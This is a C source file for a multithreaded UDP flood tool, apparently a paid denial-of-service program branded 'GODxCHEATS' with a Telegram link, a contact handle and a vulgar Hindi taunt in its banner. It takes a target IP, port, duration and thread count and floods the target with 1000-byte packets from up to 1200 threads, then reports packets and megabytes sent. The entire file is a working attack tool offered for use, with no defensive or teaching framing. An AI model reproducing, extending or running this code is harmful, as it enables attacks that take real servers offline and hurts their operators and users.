#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2025-3-28"
#define DEFAULT_PACKET_SIZE 1000 // Default packet size (512 bytes)
#define DEFAULT_THREAD_COUNT 1200   // Default number of threads

struct thread_data {
    char *ip;
    int port;
    int duration;  // Changed from 'time' to 'duration'
    unsigned long *total_packets_sent; // Pointer to total packets sent
    unsigned long *total_bytes_sent;   // Pointer to total bytes sent
};

// Function to print the banner
void print_banner() {
    printf("\033[1;33m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32mWELLCOME TO GODxCHEATS PAID FILE\033[1;37m★ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ DEVELOPED BY: \033[1;32mALONEBOY GODxCHEATS \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;31m✦ [ JOIN https://t.me/+03wLVBPurPk2NWRl ] \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ CONTACT: \033[1;32m@GODxAloneBOY \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32m NAHI HO RAHA KYA BHEN KE LODE 😆 \033[1;37m★ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    unsigned long packets_sent = 0;
    unsigned long bytes_sent = 0;
    
    // Payload ko proper string se define kiya gaya
    char payload[DEFAULT_PACKET_SIZE];  // Set the packet size

    memset(payload, 'A', DEFAULT_PACKET_SIZE);  // Fill the payload with dummy data

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;  // Changed 'time' to 'duration'

    while (time(NULL) <= endtime) {
        if (sendto(sock, payload, DEFAULT_PACKET_SIZE, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
        packets_sent++;
        bytes_sent += DEFAULT_PACKET_SIZE;
    }

    close(sock);

    // Update global counters
    *(data->total_packets_sent) += packets_sent;
    *(data->total_bytes_sent) += bytes_sent;

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Print the banner
    print_banner();

    // Check if proper arguments are provided
    if (argc < 4 || argc > 5) {
        printf("\033[0;31mUsage: ./ALONE <IP> <PORT> <DURATION> [THREADS]\n\033[0m");
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);  // Changed from 'time' to 'duration'

    // If the thread count is not provided, use the default
    int threads = (argc == 5) ? atoi(argv[4]) : DEFAULT_THREAD_COUNT;

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    unsigned long total_packets_sent = 0;
    unsigned long total_bytes_sent = 0;

    // Start the flood message
    printf("\033[1;35mFLOOD STARTED ON %s:%d FOR %d SECONDS WITH %d THREADS\n\033[0m", ip, port, duration, threads);

    time_t start_time = time(NULL);  // Get the current time

    // Create threads for the attack
    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->duration = duration;  // Changed 'time' to 'duration'
        data->total_packets_sent = &total_packets_sent;
        data->total_bytes_sent = &total_bytes_sent;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    // While the attack is processing, show the remaining time
    while (time(NULL) - start_time < duration) {
        int remaining_time = duration - (int)(time(NULL) - start_time);
        int minutes = remaining_time / 60;
        int seconds = remaining_time % 60;
        
        // Clear the line before printing
        printf("\r\033[0;31mTIME REMAINING %02d:%02d\033[0m \033[0;34mATTACK PROCESSING.............\033[0m", minutes, seconds);
        fflush(stdout);
        sleep(1);  // Update the remaining time every second
    }

    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

    // Display attack results
    printf("\n\033[1;37m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;37m║ \033[1;32mATTACK COMPLETED.\033[0m \033[1;37m║\033[0m\n");
    printf("\033[1;37m║ \033[1;34mTOTAL PACKETS SENT: \033[1;35m%lu \033[0m \033[1;37m║\033[0m\n", total_packets_sent);
    printf("\033[1;37m║ \033[1;34mTOTAL DATA SENT: \033[1;35m%.2f MB \033[0m \033[1;37m║\033[0m\n", (double)total_bytes_sent / (1024 * 1024));
    printf("\033[1;37m║ \033[1;36mATTACK FINISHED BY @GODxAloneBOY \033[0m \033[1;37m║\033[0m\n");
    printf("\033[1;37m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");

    return 0;
}
